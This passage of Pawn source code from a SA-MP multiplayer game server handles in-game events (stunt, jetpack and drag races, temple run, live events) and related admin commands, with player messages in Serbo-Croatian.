		PlayerPosInt[ playerid ] = GetPlayerInterior( playerid );
		PlayerPosVW[ playerid ] = GetPlayerVirtualWorld( playerid );

        new rand = ( EventInfo[ Drivers ]-1 );

		EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] = SMG_CreateVehicle( 411, RandomEStuntRace[ rand ][ 0 ], RandomEStuntRace[ rand ][ 1 ], RandomEStuntRace[ rand ][ 2 ]+0.5, RandomEStuntRace[ rand ][ 3 ], random( 128 ), random( 128 ), 3600 );
	    ResetVehicle( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] );

	    SMG_SetPlayerPos( playerid, RandomEStuntRace[ rand ][ 0 ], RandomEStuntRace[ rand ][ 1 ]+4, RandomEStuntRace[ rand ][ 2 ] );

	    LinkVehicleToInterior( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ], 0 );
		SetPlayerInterior( playerid, 0 );
		SetPlayerVirtualWorld(playerid, 12000);
		SetVehicleVirtualWorld(EventInfo[Vehicle][(EventInfo[Drivers]-1)], 12000);
		vCanDrive[ EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] ] = 1;
	    PutPlayerInVehicle( playerid, EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ], 0 );
		ResetVehicleStatistics( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] );
	    SetVehicleParamsEx( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ], 1, 0, 0, 0, 0, 0, 0);
	    SMG_TogglePlayerControllable( playerid, false );
	    EnableAntiCheatForPlayer(playerid, 8, false);
	    PlayerCP[playerid] = 0;

		SendClientMessage( playerid, 0xFF0000FF, "(WARNING): UKOLIKO IZADJETE IZ VOZILA BICETE DISKVALIFIKOVANI." );
		SendClientMessage( playerid, 0xFF0000FF, "(INFO): Ukoliko zelite da napustite event kucajte [ /enapusti ]." );
	}
	///////////////////////////////
	else if( EventInfo[ Started ] == event_JETPACK )
	{
	    PlayerInvited[ playerid ] = event_JETPACK;
		PlayerEventVehID[ playerid ] = ( EventInfo[ Drivers ]-1 );

		GetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ], PlayerPos[ playerid ][ 2 ] );
		PlayerPosInt[ playerid ] = GetPlayerInterior( playerid );
		PlayerPosVW[ playerid ] = GetPlayerVirtualWorld( playerid );

        new rand = ( EventInfo[ Drivers ]-1 );
	    SMG_SetPlayerPos( playerid, RandomEJPR[ rand ][ 0 ], RandomEJPR[ rand ][ 1 ]+4, RandomEJPR[ rand ][ 2 ] );
	    SetPlayerFacingAngle(playerid, RandomEJPR[rand][3]);

		SetPlayerInterior( playerid, 0 );
	    SMG_TogglePlayerControllable( playerid, false );
    	ResetPlayerWeapons( playerid );
    	SetCameraBehindPlayer(playerid);

    	PlayerCP[playerid] = 0;

		SendClientMessage( playerid, 0xFF0000FF, "(INFO): Ukoliko zelite da napustite event kucajte [ /enapusti ]." );
	}
	///////////////////////////////
	else if( EventInfo[ Started ] == event_DRAG )
	{
	    PlayerInvited[ playerid ] = event_DRAG;
		PlayerEventVehID[ playerid ] = ( EventInfo[ Drivers ]-1 );

		if( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] != IVI )
		{
		    ResetVehicle( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] );
			SMG_DestroyVehicle( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] );
		}

		GetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ], PlayerPos[ playerid ][ 2 ] );
		PlayerPosInt[ playerid ] = GetPlayerInterior( playerid );
		PlayerPosVW[ playerid ] = GetPlayerVirtualWorld( playerid );

        new rand = ( EventInfo[ Drivers ]-1 );

		EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] = SMG_CreateVehicle( 475, RandomEDragRace[ rand ][ 0 ], RandomEDragRace[ rand ][ 1 ], RandomEDragRace[ rand ][ 2 ]+0.5, RandomEDragRace[ rand ][ 3 ], random( 128 ), random( 128 ), 3600 );
	    ResetVehicle( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] );

	    SMG_SetPlayerPos( playerid, RandomEStuntRace[ rand ][ 0 ], RandomEStuntRace[ rand ][ 1 ]+4, RandomEStuntRace[ rand ][ 2 ] );

	    new vehid = EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ];

	    LinkVehicleToInterior( vehid, 0 );
		SetPlayerInterior( playerid, 0 );
		SetPlayerVirtualWorld(playerid, 12001);
		SetVehicleVirtualWorld(vehid, 12001);
		vCanDrive[ vehid ] = 1;
	    PutPlayerInVehicle( playerid, vehid, 0 );
		ResetVehicleStatistics( vehid );
	    SetVehicleParamsEx( vehid, 1, 0, 0, 0, 0, 0, 0);
	    SMG_TogglePlayerControllable( playerid, false );
	    PlayerCP[playerid] = 0;

	    DragRaceAttachs[ vehid ] = true;
	    DragRaceAttach[vehid][0] = CreateDynamicObject(920,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    SetDynamicObjectMaterial(DragRaceAttach[vehid][0], 0, 2917, "a51_crane", "girder2_grey_64HV", 0);
	    SetDynamicObjectMaterial(DragRaceAttach[vehid][0], 1, 16322, "a51_stores", "metalic128", 0);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][0], vehid, 0.000, 1.310, 0.090, 0.000, 0.000, 270.000);

	    DragRaceAttach[vehid][1] = CreateDynamicObject(1143,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    SetDynamicObjectMaterial(DragRaceAttach[vehid][1], 0, -1, "none", "none", -16777216);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][1], vehid, 0.040, 2.001, 0.230, -4.899, 90.000, 90.000);

	    DragRaceAttach[vehid][2] = CreateDynamicObject(1001,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][2], vehid, 0.000, -2.531, 0.170, 0.000, 0.000, 0.000);

	    DragRaceAttach[vehid][3] = CreateDynamicObject(1113,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][3], vehid, -0.943, -0.023, -0.590, 0.000, 0.000, -10.000);

	    DragRaceAttach[vehid][4] = CreateDynamicObject(1113,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][4], vehid, 0.845, -0.041, -0.590, 0.000, 0.000, 10.000);

	    DragRaceAttach[vehid][5] = CreateDynamicObject(1113,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][5], vehid, 0.883, 0.209, -0.590, 0.000, 0.000, 10.000);

	    DragRaceAttach[vehid][6] = CreateDynamicObject(1113,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][6], vehid, -0.981, 0.226, -0.590, 0.000, 0.000, -10.000);

	    DragRaceAttach[vehid][7] = CreateDynamicObject(1113,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][7], vehid, -1.013, 0.506, -0.590, 0.000, 0.000, -10.000);

	    DragRaceAttach[vehid][8] = CreateDynamicObject(1113,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][8], vehid, 0.915, 0.489, -0.590, 0.000, 0.000, 10.000);

	    DragRaceAttach[vehid][9] = CreateDynamicObject(2715,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    new str[5];
	    format(str, 5, "%02d", playerid+1);
	    SetDynamicObjectMaterialText(DragRaceAttach[vehid][9], 0, str, 10, "Ariel", 35, 1, -16777216, 0, 1);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][9], vehid, 0.000, -0.390, 0.659, 91.199, 0.000, 0.000);

	    DragRaceAttach[vehid][10] = CreateDynamicObject(1116,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	    AttachDynamicObjectToVehicle(DragRaceAttach[vehid][10], vehid, 0.000, 2.484, -0.406, 4.599, 0.000, 0.000);

		SendClientMessage( playerid, 0xFF0000FF, "(WARNING): UKOLIKO IZADJETE IZ VOZILA BICETE DISKVALIFIKOVANI." );
		SendClientMessage( playerid, 0xFF0000FF, "(INFO): Ukoliko zelite da napustite event kucajte [ /enapusti ]." );
	}
	///////////////////////////////
	else if( EventInfo[ Started ] == event_TEMPLERUN )
	{
	    PlayerInvited[ playerid ] = event_TEMPLERUN;

		GetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ], PlayerPos[ playerid ][ 2 ] );
		PlayerPosInt[ playerid ] = GetPlayerInterior( playerid );
		PlayerPosVW[ playerid ] = GetPlayerVirtualWorld( playerid );

		SetPlayerInterior( playerid, 0 );
	    SMG_TogglePlayerControllable( playerid, false );
		SetPlayerHealth(playerid, 100);
		ResetPlayerWeapons( playerid );

        SMG_SetPlayerPos( playerid, 3200.4226,-1614.6658,11.0098 );
        SetPlayerFacingAngle( playerid, 358.5446 );
        SetCameraBehindPlayer(playerid);
        SetPlayerVirtualWorld(playerid, 12002);
        SetPlayerTime(playerid, 12, 0);

        SMG_SetPlayerCheckpoint( playerid, 3242.0042,-1380.7875,10.9599, 3 );

		SendClientMessage( playerid, 0xFF0000FF, "(INFO): Ukoliko zelite da napustite event kucajte [ /enapusti ]." );
	}
	else if( EventInfo[ Started ] == event_LIVE )
	{
	    PlayerInvited[ playerid ] = event_LIVE;

		GetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ], PlayerPos[ playerid ][ 2 ] );
		PlayerPosInt[ playerid ] = GetPlayerInterior( playerid );
		PlayerPosVW[ playerid ] = GetPlayerVirtualWorld( playerid );

		SetPlayerInterior( playerid, 0 );
		SetPlayerHealth(playerid, 100);
		ResetPlayerWeapons( playerid );

        SMG_SetPlayerPos(playerid, eventliveX, eventliveY+2, eventliveZ+2);
        SetPlayerFacingAngle( playerid, eventliveA);
        SetCameraBehindPlayer(playerid);

		SendClientMessage( playerid, 0xFF0000FF, "(INFO): Ukoliko zelite da napustite event kucajte [ /enapusti ]." );
	}
	return 1;
}

new EventVehicleNumber = 0,
	EventVehicle[ 100 ],
	EcreateTimer;

_:public eventVehCreate(playerid, idvozila, number)
{
	new Float:x, Float:y, Float:z, Float:a;
    GetPlayerPos( playerid, x, y, z );
	GetPlayerFacingAngle( playerid, a );

	if( number < EventVehicleNumber )
	{
	    KillTimer(EcreateTimer);

	    EventVehicle[ number ] = SMG_CreateVehicle( idvozila, x+random(10), y+random(10), z, a, random( 256 ), random( 256 ), 3600 );
        ResetVehicle( EventVehicle[ number ] );
		vCanDrive[ EventVehicle[ number ] ] = 1;
    	ResetVehicleStatistics( EventVehicle[ number ] );
    	SetVehicleParamsEx( EventVehicle[ number ], 1, 0, 0, 0, 0, 0, 0);
    	EcreateTimer = SetTimerEx_("eventVehCreate", 200, 200, 1, "iii", playerid, idvozila, number+1);
	}
	else
	{
        KillTimer(EcreateTimer);
		SendInfoMessage( playerid, "Kreiranje live event vozila je zavrseno." );
	}
	return 1;
}

CMD:ekreiraj( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 || PlayerInfo[playerid][xSkriptaRank] == 8 )
	{
		new idvozila, brojvozila, Float:x, Float:y, Float:z, Float:a;
		if( sscanf( params, "ii", idvozila, brojvozila ) ) return SendUsageMessage( playerid, "/ekreiraj [id vozila] [kolicina vozila]." );

		if( idvozila < 400 || idvozila > 611 ) return SendErrorMessage( playerid, "ID vozila ne moze biti manji od 400 ili veci od 611.");
		if( brojvozila < 0 || brojvozila > 100 ) return SendErrorMessage( playerid, "Broj vozila ne moze biti manji od 0 ili veci od 100." );
		if( EventVehicleNumber != 0 ) return SendErrorMessage( playerid, "Vec su kreirana vozila." );

    	if( (ServerInfo[ BrojKreiranihVozila ]+brojvozila) > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "(ANTICHEAT): Nemoguce je trenutno kreirati vozila, jer cete prekoraciti limit vozila.");

		GetPlayerPos( playerid, x, y, z );
		GetPlayerFacingAngle( playerid, a );

		EventVehicleNumber = brojvozila;

        EventVehicle[ 0 ] = SMG_CreateVehicle( idvozila, x+random(10), y+random(10), z, a, random( 256 ), random( 256 ), 3600 );
        ResetVehicle( EventVehicle[ 0 ] );
		vCanDrive[ EventVehicle[ 0 ] ] = 1;
    	ResetVehicleStatistics( EventVehicle[ 0 ] );
    	SetVehicleParamsEx( EventVehicle[ 0 ], 1, 0, 0, 0, 0, 0, 0);

	    EcreateTimer = SetTimerEx_("eventVehCreate", 200, 200, 1, "iii", playerid, idvozila, 1);
 
	   	DodajWarnRed("~y~(EVENT) %s ~w~je kreira%s live event vozila.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );

		SendInfoMessage( playerid, "Vozila za live event ce biti kreirana kroz par sekundi." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:eunisti( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 || PlayerInfo[playerid][xSkriptaRank] == 8 )
	{
		if( EventVehicleNumber == 0 ) return SendErrorMessage( playerid, "Nisu kreirana event vozila." );

		for( new i = 0; i < EventVehicleNumber; i++ )
		{
		    ResetVehicle( EventVehicle[ i ] );
			SMG_DestroyVehicle( EventVehicle[ i ] );
		}

		EventVehicleNumber = 0;
 
	   	DodajWarnRed("~y~(EVENT) %s ~w~je unisti%s event vozila.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );

		SendInfoMessage( playerid, "Unistili ste vozila za live event." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:ekazi(playerid, const params[])
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSkriptaRank] == 8)
	{
		if(PlayerInvited[playerid] == 0) return SendErrorMessage(playerid, "Prvo moras /join na event da bi mogao pisat.");

		new str[128];
		if(sscanf(params, "s[128]", str)) return SendUsageMessage(playerid, "/ekazi [text]");

		foreach(new i : Player)
		{
		    if( PlayerInvited[ i ] != 0 || playerid == i )
			{
				new Float:X, Float:Y, Float:Z;
		        GetPlayerPos(i, X, Y, Z);
		        if( IsPlayerInRangeOfPoint( playerid, 90.0, X, Y, Z))
		        {
		        	SCMF(i, 0x33CCFFFF, "(( EVENT - %s kaze: {FFFFFF}%s {33CCFF}))", ImeIgraca(playerid), str);
		    	}
		    }
		}
    }
	else SendErrorMessage(playerid, "Niste ovlasteni za koristenje ove komande.");
	return 1;
}

CMD:eucesnici(playerid, const params[])
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSkriptaRank] == 8)
	{
		new id;
		if( sscanf( params, "i", id ) ) 
		{
			SendUsageMessage( playerid, "/eucesnici [event id]");
			SendClientMessage(playerid, -1, "ID: | 1: Stunt | 2: JetPack | 3: Drag | 4: Temple Run | 5: Live");
			return 1;
		}
		if(id < 1 || id > 5) return SendErrorMessage(playerid, "ID 1 do 5.");

		SendClientMessage( playerid, 0x33CCFFFF, "_______ Ucesnici _______");
		foreach( new i : Player)
		{
		    if( PlayerInvited[ i ] == id )
			{ 
				SCMF( playerid, -1, " - %s (id: %d)", ImeIgraca(i), i );
			}
		}
    }
	else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	return 1;
}

CMD:eucitaj( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSkriptaRank] == 8)
	{
        if( EventInfo[ Started ] > 0 ) return SendErrorMessage( playerid, "Vec je ukljucen jedan event, koristi {FFFFFF}[ /eugasi ]." );

        new broj;
    	if( sscanf( params, "i", broj ) )
		{
			SendUsageMessage( playerid, "/eucitaj [id]" );
			SendClientMessage(playerid, 0xCCCCCCFF, "ID: | 1: Stunt | 2: JetPack | 3: Drag | 4: Temple Run | 5: Live");
			return 1;
		}
		if(broj < 1 || broj > 5) return SendErrorMessage(playerid, "ID od 1 do 5.");

		switch(broj) 
		{
	    	case 1: 
	    	{
	    	    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSkriptaRank] == 8) 
	    	    {
					EventInfo[ Started ] = event_STUNT;
					EventInfo[ Drivers ] = 0;
					EventInfo[ EventTime ] = MAX_TIME;
					EventInfo[ Position ] = 0;

					SetTimer_("EventTimeR", 1000, 1000, 24);

					SendClientMessageToAll( 0x6EF83CFF, "(EVENT - STUNT RACE): Imate {FFFFFF}(20) {6EF83C}sekundi da se pridruzite na event. {FFFFFF}[ /join ]" ); 
					DodajWarnRed("~b~(EVENT): %s ~w~je pokrenu%s event ~b~'STUNT RACE'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	    	    }
	    	    else return SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	    	}
	    	case 2: 
	    	{
	    	    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSkriptaRank] == 8 ) 
	    	    {
					EventInfo[ Started ] = event_JETPACK;
					EventInfo[ Drivers ] = 0;
					EventInfo[ EventTime ] = MAX_TIME;
					EventInfo[ Position ] = 0;

					SetTimer_("EventTimeR", 1000, 1000, 24);

					SendClientMessageToAll( 0x6EF83CFF, "(EVENT - JETPACK RACE): Imate {FFFFFF}(20) {6EF83C}sekundi da se pridruzite na event. {FFFFFF}[ /join ]" ); 
					DodajWarnRed("~b~(EVENT): %s ~w~je pokrenu%s event ~b~'JETPACK RACE'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	    	    }
	    	    else return SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	    	}
	    	case 3: 
	    	{
	    	    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSkriptaRank] == 8 ) 
	    	    {
					EventInfo[ Started ] = event_DRAG;
					EventInfo[ Drivers ] = 0;
					EventInfo[ EventTime ] = MAX_TIME;
					EventInfo[ Position ] = 0;

					SetTimer_("EventTimeR", 1000, 1000, 24);

					SendClientMessageToAll( 0x6EF83CFF, "(EVENT - DRAG RACE): Imate {FFFFFF}(20) {6EF83C}sekundi da se pridruzite na event. {FFFFFF}[ /join ]" ); 
					DodajWarnRed("~b~(EVENT): %s ~w~je pokrenu%s event ~b~'DRAG RACE'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	    	    }
	    	    else return SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	    	}
	    	case 4: 
	    	{
	    	    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSkriptaRank] == 8 ) 
	    	    {
					EventInfo[ Started ] = event_TEMPLERUN;
					EventInfo[ Drivers ] = 0;
					EventInfo[ EventTime ] = MAX_TIME;
					EventInfo[ Position ] = 0;

					SetTimer_("EventTimeR", 1000, 1000, 24);

					SendClientMessageToAll( 0x6EF83CFF, "(EVENT - TEMPLE RUN): Imate {FFFFFF}(20) {6EF83C}sekundi da se pridruzite na event. {FFFFFF}[ /join ]" ); 
					DodajWarnRed("~b~(EVENT): %s ~w~je pokrenu%s event ~b~'TEMPLE RUN'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
	    	    }
	    	    else return SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	    	}
	    	case 5: 
	    	{
	    	    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSkriptaRank] == 8 ) 
	    	    {
	    	    	GetPlayerPos(playerid, eventliveX, eventliveY, eventliveZ);
	    	    	GetPlayerFacingAngle(playerid, eventliveA);

					EventInfo[ Started ] = event_LIVE;
					EventInfo[ Drivers ] = 0;
					EventInfo[ EventTime ] = 93;
					EventInfo[ Position ] = 0;

					SetTimer_("EventTimeR", 1000, 1000, 94);

					SendClientMessageToAll( 0x6EF83CFF, "(EVENT - LIVE EVENT): Imate {FFFFFF}(90) {6EF83C}sekundi da se pridruzite na event. {FFFFFF}[ /join ]" ); 
					DodajWarnRed("~b~(EVENT): %s ~w~je pokrenu%s event ~b~'LIVE EVENT'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );					
	    	    }
	    	    else return SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	    	}
	    }
	}
	else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	return 1;
}

CMD:eugasi( playerid )
{
    if(PlayerInfo[ playerid ][ xAdmin ] >= 1)
	{
		if( EventInfo[ Started ] == event_STUNT )
		{
		    EventInfo[ Drivers ] = 0;
		    EventInfo[ Started ] = 0;

		    for( new i = 0; i < 20; i++ )
			{
		 		if( EventInfo[ Vehicle ][ i ] != INVALID_VEHICLE_ID && EventInfo[Vehicle][i] != -1 )
		 		{
		 			VehicleObjectCheck( EventInfo[ Vehicle ][ i ] );
					ResetVehicle( EventInfo[ Vehicle ][ i ] );
					SMG_DestroyVehicle( EventInfo[ Vehicle ][ i ] );
		 		}
			}
			foreach( new i : Player)
			{
				if( PlayerInvited[ i ] > 0 )
				{
					PlayerInvited[ i ] = 0;
					PlayerEventVehID[ i ] = -1;
					PlayerCP[i] = 0;
					SMG_TogglePlayerControllable( i, true );
					EnableAntiCheatForPlayer(i, 8, true);
					DisablePlayerRaceCheckpoint(i);

		            SMG_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
					SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
					SetPlayerInterior( i, PlayerPosInt[ i ] );
				}
			}
			DodajWarnRed("~b~(EVENT) %s ~w~je ugasi%s event ~b~'STUNT RACE'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
		else if( EventInfo[ Started ] == event_JETPACK )
		{
		    EventInfo[ Drivers ] = 0;
		    EventInfo[ Started ] = 0;

			foreach( new i : Player)
			{
				if( PlayerInvited[ i ] > 0 )
				{
					PlayerInvited[ i ] = 0;
					PlayerCP[i] = 0;
					SMG_TogglePlayerControllable( i, true );
					DisablePlayerRaceCheckpoint(i);

		            SMG_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ], PlayerPos[ i ][ 2 ] );
					SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
					SetPlayerInterior( i, PlayerPosInt[ i ] );
				}
			}
			DodajWarnRed("~b~(EVENT) %s ~w~je ugasi%s event ~b~'JETPACK RACE'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
		else if( EventInfo[ Started ] == event_DRAG )
		{
		    EventInfo[ Drivers ] = 0;
		    EventInfo[ Started ] = 0;

		    for( new i = 0; i < 20; i++ )
			{
		 		if( EventInfo[ Vehicle ][ i ] != INVALID_VEHICLE_ID && EventInfo[Vehicle][i] != -1 )
		 		{
		 			VehicleObjectCheck( EventInfo[ Vehicle ][ i ] );
					ResetVehicle( EventInfo[ Vehicle ][ i ] );
					SMG_DestroyVehicle( EventInfo[ Vehicle ][ i ] );
		 		}
			}
			foreach( new i : Player)
			{
				if( PlayerInvited[ i ] > 0 )
				{
					PlayerInvited[ i ] = 0;
					PlayerEventVehID[ i ] = -1;
					PlayerCP[i] = 0;
					SMG_TogglePlayerControllable( i, true );
					EnableAntiCheatForPlayer(i, 8, true);
					DisablePlayerRaceCheckpoint(i);

		            SMG_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
					SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
					SetPlayerInterior( i, PlayerPosInt[ i ] );
				}
			}
			DodajWarnRed("~b~(EVENT) %s ~w~je ugasi%s event ~b~'DRAG RACE'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
		else if( EventInfo[ Started ] == event_TEMPLERUN )
		{
		    EventInfo[ Drivers ] = 0;
		    EventInfo[ Started ] = 0;

			foreach( new i : Player)
			{
				if( PlayerInvited[ i ] > 0 )
				{
					PlayerInvited[ i ] = 0;
					PlayerCP[i] = 0;
					SMG_TogglePlayerControllable( i, true );

		            SMG_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
					SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
					SetPlayerInterior( i, PlayerPosInt[ i ] );
					DisablePlayerCheckpoint(i);
				}
			}
			DodajWarnRed("~b~(EVENT) %s ~w~je ugasi%s event ~b~'TEMPLE RUN'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
		else if( EventInfo[ Started ] == event_LIVE )
		{
		    EventInfo[ Drivers ] = 0;
		    EventInfo[ Started ] = 0;

			foreach( new i : Player)
			{
				if( PlayerInvited[ i ] > 0 )
				{
					PlayerInvited[ i ] = 0;
					PlayerCP[i] = 0;
					SMG_TogglePlayerControllable( i, true );

		            SMG_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
					SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
					SetPlayerInterior( i, PlayerPosInt[ i ] );
					DisablePlayerCheckpoint(i);
				}
			}
			DodajWarnRed("~b~(EVENT) %s ~w~je ugasi%s event ~b~'LIVE EVENT'.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
		else return SendErrorMessage( playerid, "Nijedan event nije upaljen");
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:live(playerid)
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 1) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( EventInfo[ Started ] != event_LIVE ) return SendErrorMessage( playerid, "Trenutno nema aktivnog live eventa.");

	ShowPlayerDialog( playerid, dialog_LIVEEVENT, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																						"#\t\tRadnja\tOpcija\n\
																						{4282C0}(1).\t{FFFFFF}ORUZJE\tDaj oruzje svim sudionicima na eventu\n\
																						{4282C0}(2).\t{FFFFFF}FREEZE\tZaleduje sve igrace na eventu\n\
																						{4282C0}(3).\t{FFFFFF}UN FREEZE\tOdleduje sve igrace na eventu\n\
																						{4282C0}(4).\t{FFFFFF}SET ARMOR\tSetuje svim igracima na eventu armor\n\
																						{4282C0}(5).\t{FFFFFF}SET HEALTH\tSetuje svim igracimana na eventu HP", "Odaberi", "Odustani");
	return 1;
}

CMD:sneg( playerid )
{
	#if ZIMSKI_MOD == 1

        if( GetPlayerInterior( playerid ) != 0 || GetPlayerVirtualWorld( playerid ) != 0 )
		{
			 SendErrorMessage( playerid, "Ne mozes u interijeru!" );
			 return 1;
		}
        if( !Snow[ playerid ] )
		{
			Snow[ playerid ] = true;

            new Float:x, Float:y, Float:z;
			GetPlayerPos( playerid, x, y, z);
			SnowObject[ playerid ] = CreatePlayerObject( playerid, 18864, x, y, z-5, 0.0, 0.0, 0.0, 300.0 );

			for(new i = 0; i < sizeof(snowStreet); i++) Streamer_ToggleItem(playerid, STREAMER_TYPE_OBJECT, snowStreet[i], true);
		}
		else if( Snow[ playerid ] )
		{
		    Snow[ playerid ] = false;
			DestroyPlayerObject( playerid, SnowObject[ playerid ] );

			for(new i = 0; i < sizeof(snowStreet); i++) Streamer_ToggleItem(playerid, STREAMER_TYPE_OBJECT, snowStreet[i], false);
		}

	#else

		SendErrorMessage( playerid, "Nije zimski period!");

	#endif
	return 1;
}

CMD:poklon( playerid )
{
    #if XMAS_MOD == 1

		new presentID = GetNearestPresent( playerid );
		if( presentID == -1 ) return SendErrorMessage( playerid, "Morate biti pored poklona." );
		if( presentsInfo[ presentID ][ presTaken ] ) return SendErrorMessage( playerid, "Poklon je vec otvoren." );
		if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozete uzeti poklon iz vozila!" );

		PlayerInfo[ playerid ][ xPoklon ]++;
		sql_user_update_integer( playerid, "gift", PlayerInfo[ playerid ][ xPoklon ] );

		new const rid = random(7);
		switch(rid)
		{
			case 0:
			{
				new const cash = 1000+random(2000);
				DajIgracuNovac(playerid, cash);

				SendClientMessageToAllEx( 0x2641FEFF, "(POKLON): {FFFFFF}%s {2641FE}je upravo otvori%s poklon i pronasa%s {FFFFFF}$%d.", ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", PlayerInfo[playerid][xPol] == 1 ? "o" : "la", cash );
				SCMF(playerid, 0x241FEFF, "(POKLON): Otvorili ste poklon i pronasli {FFFFFF}$%d", cash);
			}
			case 1:
			{
				new const cash = 10+random(10);
				PlayerInfo[playerid][xZlato] += cash;
				sql_user_update_integer(playerid, "xZlato", PlayerInfo[playerid][xZlato]);

